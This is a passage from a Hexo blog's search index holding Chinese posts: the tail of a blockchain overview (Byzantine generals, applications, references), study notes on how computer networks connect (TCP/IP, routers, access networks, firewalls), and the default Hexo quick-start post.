拜占庭将军问题，是由莱斯利·兰伯特提出的点对点通信中的基本问题。含义是在存在消息丢失的不可靠信道上试图通过消息传递的方式达到一致性是不可能的。</p><p>　　拜占庭将军问题是一个协议问题，拜占庭帝国军队的将军们必须全体一致的决定是否攻击某一支敌军。问题是这些将军在地理上是分隔开来的，并且将军中存在叛徒。叛徒可以任意行动以达到以下目标：欺骗某些将军采取进攻行动；促成一个不是所有将军都同意的决定，如当将军们不希望进攻时促成进攻行动；或者迷惑某些将军，使他们无法做出决定。如果叛徒达到了这些目的之一，则任何攻击行动的结果都是注定要失败的，只有完全达成一致的努力才能获得胜利。[7]</p><hr><h1 id="05-发展现状"><a href="#05-发展现状" class="headerlink" title="05 发展现状"></a>05 发展现状</h1><h2 id="0x01-信息共享领域"><a href="#0x01-信息共享领域" class="headerlink" title="0x01 信息共享领域"></a>0x01 信息共享领域</h2><p>　　区块链与其他行业融合的应用，其中最直接的一个领域就是信息领域。首先，区块链本身就是需要保持各个节点的数据一致性的，可以说是自带信息共享功能；其次，实时的问题通过区块链的P2P技术可以实现；最后，利用区块链的不可篡改和共识机制，可构建其一条安全可靠的信息共享通道。[1]</p><h2 id="0x02-版权保护"><a href="#0x02-版权保护" class="headerlink" title="0x02 版权保护"></a>0x02 版权保护</h2><p><strong>区块链 + 鉴证证明</strong></p><p><strong>流程简化</strong>：区块链应用到鉴证证明后，无论是登记还是查询都非常方便，无需再奔走于各个部门之间。</p><p><strong>安全可靠</strong>：区块链的去中心化存储，<strong>保证没有一家机构可以任意篡改数据</strong>。</p><p><strong>应用案例</strong>：2017年12月,微众银行 仲裁委(广州仲裁委) 杭州亦笔科技有限公司共同推出的仲裁联盟链,用于司法场景下的存证;2018年3月,广州首个 仲裁链 判决书出炉。[1]</p><h2 id="0x03-物流链"><a href="#0x03-物流链" class="headerlink" title="0x03 物流链"></a>0x03 物流链</h2><p>　　区块链没有中心化节点，各节点是平等的，掌握单个节点无法实现修改数据；需要掌控足够多的节点，才可能伪造数据，大大提高伪造数据的成本。</p><p>　　区块链天生的开放、透明，使得任何人都可以公开查询，伪造数据被发现的概率大增。</p><p>　　区块链的数据不可篡改性，也保证了已销售出去的产品信息已永久记录，无法通过简单复制防伪信息蒙混过关，实现二次销售。 </p><p>　　物流链的所有节点接入区块链后，商品从生产商到消费者手里都有迹可循，形成完整链条；商品缺失的环节越多，将暴露出其是伪劣产品概率更大。</p><p>　　应用案例：目前,入局物流链的玩家较多,包括腾讯 阿里 京东 沃尔玛等。[1]</p><h1 id="06-参考"><a href="#06-参考" class="headerlink" title="06 参考"></a>06 参考</h1><p>[1] <a href="https://www.zhihu.com/question/55570521" target="_blank" rel="noopener">知乎：区块链怎么赚钱，有什么经济前景？</a></p><p>[2] <a href="https://finance.sina.com.cn/stock/usstock/c/2019-05-04/doc-ihvhiqax6629170.shtml" target="_blank" rel="noopener">巴菲特:比特币是一种“赌博” 很多欺诈行为与之有关</a></p><p>[3] <a href="http://www.vodvv.com/index.php/2020/06/25/9018/" target="_blank" rel="noopener">【区块链技术】区块链技术如何赋能智能制造？</a></p><p>[4] <a href="https://learning.oreilly.com/library/view/mastering-blockchain-/9781788839044/" target="_blank" rel="noopener">Mastering Blockchain - Second Edition by Imran Bashir</a></p><p>[5] <a href="chainnews.com/articles/114443917083.htm">科普：区块链里常见的攻击</a></p><p>[6] <a href="https://blog.csdn.net/qq_36764147/article/details/89766063?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=Deconstructing%20the%20Blockchain%20&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-89766063#1.%20%E6%AF%94%E7%89%B9%E5%B8%81%E7%9A%84%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B%5B4%5D" target="_blank" rel="noopener">区块链技术概述</a></p><p>[7] <a href="[https://baike.baidu.com/item/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%86%E5%86%9B%E9%97%AE%E9%A2%98#4](https://baike.baidu.com/item/拜占庭将军问题#4">百度百科：拜占庭将军问题</a>)</p><hr><ul><li>回形针视频介绍：<a href="https://www.bilibili.com/video/BV1oJ411E7Lg?p=1&amp;share_medium=android&amp;share_plat=android&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1593348364&amp;unique_k=TEpPdG" target="_blank" rel="noopener">区块链到底是什么？</a></li><li><a href="https://www.youtube.com/watch?v=g_fSistU3MQ" target="_blank" rel="noopener">比特币和区块链啥原理？矿机挖矿咋回事？李永乐老师讲比特币(1)</a></li><li><a href="https://www.youtube.com/watch?v=pbAVauYsqP0" target="_blank" rel="noopener">比特币交易如何防伪？私钥公钥地址啥意思？李永乐老师讲比特币(2)</a></li><li><a href="https://www.youtube.com/watch?v=e9KVmyI1eCg" target="_blank" rel="noopener">拜占庭将军问题是什么？区块链如何解决防范恶意节点？</a></li><li><a href="https://www.bilibili.com/video/av12465079" target="_blank" rel="noopener">【官方双语】想知道比特币（和其他加密货币）的原理吗？</a></li><li><a href="https://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html" target="_blank" rel="noopener">区块链入门教程</a></li><li><a href="https://zhuanlan.zhihu.com/p/79450808" target="_blank" rel="noopener">比特币挖矿攻击中的PAW和BSM</a></li><li><a href="https://zhuanlan.zhihu.com/p/52901666" target="_blank" rel="noopener">比特币中的挖矿攻击</a></li><li><a href="https://zhuanlan.zhihu.com/p/32585236" target="_blank" rel="noopener">区块链数字货币的9种共识机制比较</a></li><li><a href="https://zhuanlan.zhihu.com/p/102893427" target="_blank" rel="noopener">从POW到POS看区块链共识的发展</a></li></ul><h1 id="07-一些网站"><a href="#07-一些网站" class="headerlink" title="07 一些网站"></a>07 一些网站</h1><ul><li>寻找中本聪：<a href="https://nakamotoinstitute.org/" target="_blank" rel="noopener">Satoshi Nakamoto Institute</a></li><li><a href="https://www.blockchain.com/explorer?utm_campaign=expnav_explorer" target="_blank" rel="noopener">Blockchain</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 未定义 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络是怎样连接的笔记</title>
      <link href="/2019/10/20/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/10/20/%E7%BD%91%E7%BB%9C%E6%98%AF%E6%80%8E%E6%A0%B7%E8%BF%9E%E6%8E%A5%E7%9A%84%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><hr><h2 id="第一章-浏览器生成消息-Web浏览器"><a href="#第一章-浏览器生成消息-Web浏览器" class="headerlink" title="第一章 浏览器生成消息(Web浏览器)"></a>第一章 浏览器生成消息(Web浏览器)</h2><h3 id="章节"><a href="#章节" class="headerlink" title="章节"></a>章节</h3><ul><li><strong>生成HTTP请求信息</strong></li><li><strong>向DNS服务器查询Web服务器的IP地址</strong></li><li><strong>全世界DNS服务器的大接力</strong></li><li><strong>委托协议栈发送信息</strong></li></ul><h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><ol><li>URL：Uniform Resource Locator 统一资源定位符</li><li>FTP: File Transfer Protocol 文本传送协议</li><li>HTTP: Hypertext Transfer Protocol 超文本传送协议</li><li>DNS：Domain Name System 域名服务系统</li><li>协议栈：操作系统内部的网络控制软件，也叫“协议驱动” “TCP/IP驱动”等。</li><li>UDP：User Datagram Protocol 用户数据报协议</li></ol><h3 id="KEY"><a href="#KEY" class="headerlink" title="KEY"></a>KEY</h3><ol><li>1条请求信息中只能写1个URL。如果需要获取多个文件，必须对每个文件单独发送1条请求。</li><li>IP地址的主机号：全0表示整个子网，全1表示向子网上所有设备发送包，即“广播”。</li><li>Socke库是用于调用网络功能的程序组件集合。</li><li>根据域名查IP地址时，浏览器会使用Socket库中的解析器。</li><li>DNS服务器会从域名与IP地址的对照表中查找相应的记录，并返回IP地址。</li><li>在域名中，越靠右的位置表示其层次越高；下级的域称为子域。</li><li>向操作系统内部的协议栈发出委托时，需要按照指定的顺序来调用Socket库中的程序组件。</li><li>收发数据的操作：<ul><li>创建：创建套接字</li><li>连接：将管道连接到服务器端的套接字上</li><li>通信：收发数据</li><li>断开：断开管道并删除套接字</li></ul></li><li>应用程序是通过“描述符”这一类似号码牌的东西来识别套接字的。</li><li>IP地址不是分配给每个设备，而是分配给设备中安装的网络硬件的。</li><li>描述符：应用程序用来识别套接字的机制</li><li>IP地址和端口号：客户端和服务器之间用来识别对方套接字的机制</li><li>向DNS服务器发送请求消息的程序是解析器。</li><li>URL中的www是Web服务器上的一种命名；World Wide Web，中文名字为“万维网”，”环球网”等，常简称为Web。</li></ol><hr><h2 id="第2章-用电信号传输TCP-IP数据-协议栈、网卡"><a href="#第2章-用电信号传输TCP-IP数据-协议栈、网卡" class="headerlink" title="第2章 用电信号传输TCP/IP数据(协议栈、网卡)"></a>第2章 用电信号传输TCP/IP数据(协议栈、网卡)</h2><h3 id="章节-1"><a href="#章节-1" class="headerlink" title="章节"></a>章节</h3><ul><li><strong>创建套接字</strong></li><li><strong>连接服务器</strong></li><li><strong>收发数据</strong></li><li><strong>从服务器断开并删除套接字</strong></li><li><strong>IP与以太网的包收发操作</strong></li><li><strong>UDP协议的收发操作</strong></li></ul><h3 id="术语-1"><a href="#术语-1" class="headerlink" title="术语"></a>术语</h3><ol><li>MAC：Media Access Control / MAC地址：符合IEEE规格的局域网设备都使用统一格式的地址。</li><li>PID：Process ID 进程标识符</li><li>MTU：Maximum Transmission Unit 最大传输单元</li><li>MSS：Maximum Segment Size 最大分段大小</li><li>SFD：Start Frame Delimiter 起始帧分界符</li><li>FCS：Frame Check Sequence 帧校验序列</li><li>SUN：Synchronize 同步</li><li>ACK：Acknowledge character 确认字符（在数据通信中，接收站发给发送站的一种传输类控制字符。表示发来的数据已确认接收无误）</li><li>ARP：Address Resolution Protocol 地址解析协议</li><li>CRC：Cyclic Redundancy Check 循环冗余校验</li><li>MAU：Medium Attachment Unit 介质连接单元</li><li>PHY：Physical Layer Device 物理层设置</li><li>PnP：Plug and Play 是一种自动对扩展卡和周边设备进行配置的功能。</li></ol><h3 id="KEY-1"><a href="#KEY-1" class="headerlink" title="KEY"></a>KEY</h3><ol><li>浏览器、邮件等一般应用程序收发数据用TCP；DNS查询等收发较短的控制数据时用UDP。</li><li>IP中还包含ICMP协议和ARP协议.ICMP用来告知网络包传送过程中产生的错误以及各种控制信息，ARP用来根据IP地址查询相应的以太网MAC地址。</li><li>协议栈是根据套接字中记录的控制信息来工作的。</li><li>创建套接字时，首先分配一个套接字所需的内存空间，然后向其中写入初始状态。</li><li>通信操作中使用的控制信息分为两类：头部中记录的信息、套接字(协议栈中的内存空间)中记录的信息。</li><li>连接操作的第一步是在TCP模块处创建表示连接控制信息的头部。</li><li>通过TCP头部中的发送方和接收方端口号可以找到要连接的套接字。</li><li>MTU：一个网络包的最大长度，以太网中一般为1500字节；MSS：除去头部后，一个网络包所能容纳的TCP数据的最大长度。</li><li>通过“序号”和“ACK号”可以确认接收方是否接收到了网络包。</li><li>能够接收的最大数据量称为窗口大小，一般和接收方的缓冲区大小一致。</li><li>集线器是按照以太网规则传输包的设备，路由器是按照IP规则传输包的设备。</li><li>IP模块负责添加两个头部：MAC头部(以太网用的头部，包含MAc地址)、IP头部(IP用的头部，包含IP地址)。</li><li>无论要收发的包是控制包还是数据包，IP对各种类型的包的收发操作都是相同的。</li><li>IP头部的“接受方IP地址”填写通信对象的IP。发送方IP地址需要判断发送所使用的网卡，并填写该网卡的IP地址。</li><li>子网掩码：用来判断IP地址中网络号与主机号分界线的地址。</li><li>IP模块根据路由表Gateway栏的内容判断应该把包发送给谁。</li><li>以太网3个性质：将包发送到MAC头部的接收方MAC地址代表的目的地、用发送方MAC地址识别发送方、用以太类型识别包的内容。</li><li>网卡的ROM中保存着全世界唯一的MAC地址，这是在生产网卡时写入的。</li><li>网卡中保存的MAC地址会由网卡驱动程序读取并分配给MAC模块。</li><li>每个包的前面都有报头和SFD，报头用来测定时机，SFD用来确定帧的起始位置。</li><li>网卡的MAC模块生成通用信号，然后由PHY(MAU)模块转换成可在网线中传输的格式，并通过网线发送出去。</li><li>端口号用来指定服务器程序的种类，位于TCP头部。</li><li>TCP对包是否正确送达进行确认。</li><li>在收到ACK号之前继续发送下一个包的方式是滑动窗口方式。</li></ol><hr><h2 id="第3章-从网线到网络设备-集线器、交换机、路由器"><a href="#第3章-从网线到网络设备-集线器、交换机、路由器" class="headerlink" title="第3章 从网线到网络设备(集线器、交换机、路由器)"></a>第3章 从网线到网络设备(集线器、交换机、路由器)</h2><h3 id="章节-2"><a href="#章节-2" class="headerlink" title="章节"></a>章节</h3><ul><li><strong>信号在网线和集线器中传输</strong></li><li><strong>交换机的包转发操作</strong></li><li><strong>路由器的包转发操作</strong></li><li><strong>路由器的附加功能</strong></li></ul><h3 id="术语-2"><a href="#术语-2" class="headerlink" title="术语"></a>术语</h3><ol><li>MDI：Media Dependent Interface 媒体相关接口 （MDI-X：MDI-Crossover）</li><li>ICMP：Internet Control Message Protocol Internet控制报文协议（当包传输过程中发生错误时，用来发送控制信息）</li><li>TTL：Time to Live 生存时间</li><li>PPPoE：PPP over Ethernet 以太网的点对点协议（它是一种控制ADSL、FTTH等宽带网络的方式）</li><li>Public Address(Globally Unique Address): 公有地址</li><li>Private IP Address：私有地址</li></ol><h3 id="KEY-2"><a href="#KEY-2" class="headerlink" title="KEY"></a>KEY</h3><ol><li>双绞线对噪声的抑制：<ul><li>通过两个信号线的缠绕抵消外源性噪声</li><li>通过改变节距抑制内源性噪声</li></ul></li><li>集线器将信号发送到所有连接到他上面的线路。</li><li>交换机的MAC模块没有MAC地址；路由器的各个端口都具有MAC地址和IP地址。</li><li>广播地址（broadcast address）是一种特殊的地址，将广播地址设为接收方地址时，包会发送到网络中所有设备。MAC地址中的FF:FF:FF:FF:FF:FF和IP地址中的255.255.255.255都是广播地址。</li><li>交换机的全双工模式可以同时接受和发送信号。</li><li>路由器是基于IP设计的，根据“IP地址”判断转发目标；交换机是基于以太网设计的，交换机根据MAC地址表查找MAC地址，然后将信号发送到相应端口。</li><li>路由器会忽略主机号，只匹配网络号。</li><li>路由器的子网掩码列只表示在匹配网络包目标地址时需要对比的比特数量。</li><li>路由器的端口都具有MAC地址，只接收与自身地址匹配的包，遇到不匹配的包则直接丢弃。</li><li>通过路由器转发的网络包，其接收方MAC地址为路由器端口的MAC地址。</li><li>路由表中子网掩码为0.0.0.0的记录表示“默认路由”。</li><li>路由器判断下一个转发目标的方法：、<ul><li>如果路由表的网关列内容为IP地址，则该地址就是下一个转发目标。</li><li>如果路由表的网关列内容为空，则IP头部中的接收方IP地址就是下一个转发目标。</li></ul></li><li>路由器也会使用ARP来查询下一个转发目标的MAC地址。</li><li>IP（路由器）负责将包送达通信对象这个整体过程，而其中将包传输到下一个路由器的过程则是由以太网（交换机）来负责的。</li><li>将大网络包进行拆分的功能是分片。</li></ol><hr><h2 id="第4章-通过接入网进入互联网内部-接入网、网络运营商"><a href="#第4章-通过接入网进入互联网内部-接入网、网络运营商" class="headerlink" title="第4章 通过接入网进入互联网内部(接入网、网络运营商)"></a>第4章 通过接入网进入互联网内部(接入网、网络运营商)</h2><h3 id="章节-3"><a href="#章节-3" class="headerlink" title="章节"></a>章节</h3><ul><li><strong>ADSL接入网的结构和工作方式</strong></li><li><strong>光纤接入网(FTTH)</strong></li><li><strong>接入网中使用的PPP和隧道</strong></li><li><strong>网络运营商内部</strong></li><li><strong>跨越运营商的网络包</strong></li></ul><h3 id="术语-3"><a href="#术语-3" class="headerlink" title="术语"></a>术语</h3><ol><li>ADSL：Asymmetric Digital Subscriber Line  不对称数字用户线 （它是一种利用架设在电线杆上的金属电话线来进行高速通信的技术，他的上行方向(用户到互联网)和下行方向(互联网到用户)的通信速率是不对称的。）</li><li>ADSL Modem：调制解调器</li><li>FTTH：Fiber To The Home 光纤到户</li><li>BAS：Broadband Access Server 宽带接入服务器（它是一种路由器）</li><li>PPP：Point-to-Point Protocol 点到点协议（他是电话线、ISDN等通信线路所使用的一种协议，集成了用户认证、配置下发、数据压缩、加密等各种功能）</li><li>DSLAM：DSL Access Multiplexer 数字用户线接入复用设备（它是一种电话局用的多路ADSL Modem，可以理解为将多个ADSL Modem整合在一个外壳里的设备。）</li><li>ONU：Optical Network Unit 光网络单元（他和光纤收发器一样，可以将电信号转化为光信号，除此之外还具有和电话局的OLT相互配合避免信号碰撞的功能。这个设备有时也叫做终端盒，因此终端盒这个词本身是对光纤收发器和ONU等光纤终端设备的统称。）</li><li>OLT：Optical Line Terminal 光线路终端</li><li>RADIUS：Remote Authentication Dial-in User Service 远程认证拨号用户服务</li><li>RAS：Remote Access Server 远程访问服务器</li><li>DHCP：Dynamic Host Configuration Protocol 动态主机配置协议</li><li>CHAP：Challenge Handshake Authentication Protocol 挑战握手认证协议</li><li>PAP：Password Authentication Protocol 密码认证协议</li><li>PPPoA：Point-to-Point Protocol over ATM</li><li>POP：Point of Presense 接入点</li><li>NOC：Network Operation Center 网络运行中心</li><li>BGP：Border Gateway Protocol 边界网关协议</li><li>IX：Internet eXchange 互联网交换中心</li></ol><h3 id="KEY-3"><a href="#KEY-3" class="headerlink" title="KEY"></a>KEY</h3><ol><li>距离的不同和路由的维护方式，就是互联网与家庭、公司网络之间最主要的两个不同点。</li><li>互联网接入路由器在网络包前面加上MAC地址、PPPoE头部、PPP头部总共三个头部，然后发送给ADSL Modem（PPPoE方式下）。</li><li>ADSL Modem将包拆分成信元，并转换成电信号发送给分离器。</li><li>ATM：Asynchronous Transfer Mode 异步传输（他是在以电话线为载体的传统电话技术基础上扩展出来的一种通信方式。它的数据传输是以“信元”为单位进行的，这和以包为单位传输数据的TCP/IP很像，但这种方式并不适用于计算机通信。）</li><li>DSLAM具有ATM接口，和后方路由器收发数据时使用的是原始网络包拆分后的ATM信元形式。</li><li>BAS负责将ATM信元还原成网络包并转发到互联网内部。</li><li>PPPoE是将PPP信息装入以太网包进行传输的方式。</li><li>互联网接入路由器通过PPPoE的发现机制查询BAS的MAC地址。</li><li>BAS下发的TCP/IP参数会被配置到互联网接入路由器的BAS端的端口上，这样路由器就完后接入互联网的准备了。</li><li>BAS在收到用户路由器发送的网络包之后，会去掉MAC头部和PPPoE头部，然后用隧道机制将包发送给网络运营商的路由器。</li><li>一对一连接的端口可以不分配IP地址，这种方式称为无编码。</li><li>PPPoA方式不添加MAC头部和PPPoE头部，而是直接将包装入信元中。</li><li>还有一种DHCP方式，他不使用PPP，而是将以太网包直接转换成ADSL信号发送给DSLAM。</li><li>网络包通过接入网之后，到达运营商POP的路由器。</li><li>ATM交换机是转发ATM信元的设备，负责将DSLAM输出的信元转发给BAS。</li><li>互联网内部使用BGP机制在运营商之间交换路由信息。</li><li>接入网：用于连接网络运营商的线路</li><li>要使用ADSL服务，需要安装一个将电话信号和ADSL信号分开的设备——分离器。</li><li>BAS与一般的路由器不同：BAS具有身份认证、向客户端下发IP地址等配置信息的功能。</li></ol><h2 id="第5章-服务器端的局域网中有什么玄机-防火墙、缓存服务器"><a href="#第5章-服务器端的局域网中有什么玄机-防火墙、缓存服务器" class="headerlink" title="第5章 服务器端的局域网中有什么玄机(防火墙、缓存服务器)"></a>第5章 服务器端的局域网中有什么玄机(防火墙、缓存服务器)</h2><h3 id="章节-4"><a href="#章节-4" class="headerlink" title="章节"></a>章节</h3><ul><li><strong>Web服务器的部署地点</strong></li><li><strong>防火墙的结构与原理</strong></li><li><strong>通过将请求平均分配给多台服务器来平衡负载</strong></li><li><strong>使用缓存服务器分担负载</strong></li><li><strong>内容分发服务</strong></li></ul><h3 id="术语-4"><a href="#术语-4" class="headerlink" title="术语"></a>术语</h3><ol><li>Cookie：储存在用户本地终端上的数据</li><li>forward proxy：正向代理（是一个位于客户端和原始服务器(origin server)之间的服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，然后代理向原始服务器转交请求并将获得的内容返回给客户端。客户端才能使用正向代理。）</li><li>reverse proxy：反向代理（理服务器来接受客户端的网络访问连接请求，然后服务器将请求有策略的转发给网络中实际工作的业务服务器，并将从业务服务器处理的结果，返回给网络上发起连接请求的客户端）</li><li>transparent proxy：透明代理（客户端根本不需要知道有代理服务器的存在，它改变你的request fields（报文），并会传送真实IP，多用于路由器的NAT转发中。注意，加密的透明代理则是属于匿名代理，意思是不用设置使用代理了，例如Garden 2程序。）</li><li>NAt：Network Address Translation 网络地址转换</li></ol><h3 id="KEY-4"><a href="#KEY-4" class="headerlink" title="KEY"></a>KEY</h3><ol><li>包过滤方式的防火墙可根据接收方IP地址、发送方IP地址、接收方端口号、发送方端口号、控制位等信息来判断是否允许某个包通过。</li><li>现在主流的防火墙方式叫包过滤方式。</li><li>当防火墙需要确定应用程序种类是要检查端口号信息。</li><li>用于分担Web服务器负载，将访问分配到多台服务器上的设备是负载均衡器。</li><li>在互联网中部署多台缓存服务器，并将其租借给Web服务器运营者的服务叫内容分发服务（CDS或CDN）。</li></ol><hr><h2 id="第6章-请求到达Web服务器，响应返回浏览器-Web服务器"><a href="#第6章-请求到达Web服务器，响应返回浏览器-Web服务器" class="headerlink" title="第6章 请求到达Web服务器，响应返回浏览器(Web服务器)"></a>第6章 请求到达Web服务器，响应返回浏览器(Web服务器)</h2><h3 id="章节-5"><a href="#章节-5" class="headerlink" title="章节"></a>章节</h3><ul><li><strong>服务器概览</strong></li><li><strong>服务器的接收操作</strong></li><li><strong>web服务器程序解释请求信息并作出响应</strong></li><li><strong>浏览器接收响应信息并显示内容</strong></li></ul><h3 id="KEY-5"><a href="#KEY-5" class="headerlink" title="KEY"></a>KEY</h3><ol><li>使用描述符来指代套接字的原因：等待连接的套接字中的没有客户端IP地址和端口号；使用描述符这一信息比较简单。</li><li>网卡的MAC模块将网络包从信号还原为数字信息，校验FCS并存入缓冲区。</li><li>网卡驱动会根据MAC头部判断协议类型，并将包交给相应的协议栈。</li><li>协议栈的IP模块会检查IP头部：<ul><li>判断是不是发给自己的</li><li>判断网络包是否经过分片</li><li>将包转交给TCP模块或UDP模块。</li></ul></li><li>如果收到是发起连接的包，则TCP模块：<ul><li>确认TCP头部的控制位SYN</li><li>检查收接方端口号</li><li>为相应的等待连接套接字复制一个新副本</li><li>记录发送方IP地址和端口号等信息</li></ul></li><li>收到数据包时，TCP模块：<ul><li>根据收到的包的发送方IP地址、发送方端口号、接收方IP地址、接收方端口号找到相应的套接字</li><li>将数据块拼合起来并保存在接受缓冲区中</li><li>向客户端返回ACK</li></ul></li><li>当包到达服务器时，网卡会接收信号并通知CPU，此时使用的机制是中断。</li><li>Web服务器可以同时处理多个客户端的访问，这里利用操作系统的多任务和多线程功能。</li><li>当需要对Web服务器的访问进行限制时，可以判断是否访问的条件：<ul><li>客户端IP地址</li><li>客户端域名</li><li>用户名和密码</li></ul></li><li>web服务器返回的数据包括文档、图片等多种类型，客户端原则上根据响应消息的Content-Type头部字段的值判断返回数据的不同类型。</li></ol><hr><p><strong><a href="https://jerryc.me/posts/20bbe8ff/" target="_blank" rel="noopener">推荐阅读</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/09/13/hello-world/"/>
      <url>/2019/09/13/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="install-Hexo"><a href="#install-Hexo" class="headerlink" title="install Hexo"></a>install Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g</span><br></pre></td></tr></table></figure><h3 id="upgrade-Hexo"><a href="#upgrade-Hexo" class="headerlink" title="upgrade Hexo"></a>upgrade Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update hexo -g</span><br></pre></td></tr></table></figure><h3 id="init-Blog"><a href="#init-Blog" class="headerlink" title="init Blog"></a>init Blog</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">"My New Post"</span> </span><br><span class="line">hexo n <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p><h3 id="Clear-cache"><a href="#Clear-cache" class="headerlink" title="Clear cache"></a>Clear cache</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure><h3 id="Local-Testing"><a href="#Local-Testing" class="headerlink" title="Local Testing"></a>Local Testing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo server <span class="comment">#Hexo会监视文件变动并自动更新，无须重启服务器</span></span><br><span class="line">hexo server -s <span class="comment">#静态模式</span></span><br><span class="line">hexo server -p 5000 <span class="comment">#更改端口</span></span><br><span class="line">hexo server -i 192.168.1.1 <span class="comment">#自定义 IP</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 未定义 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
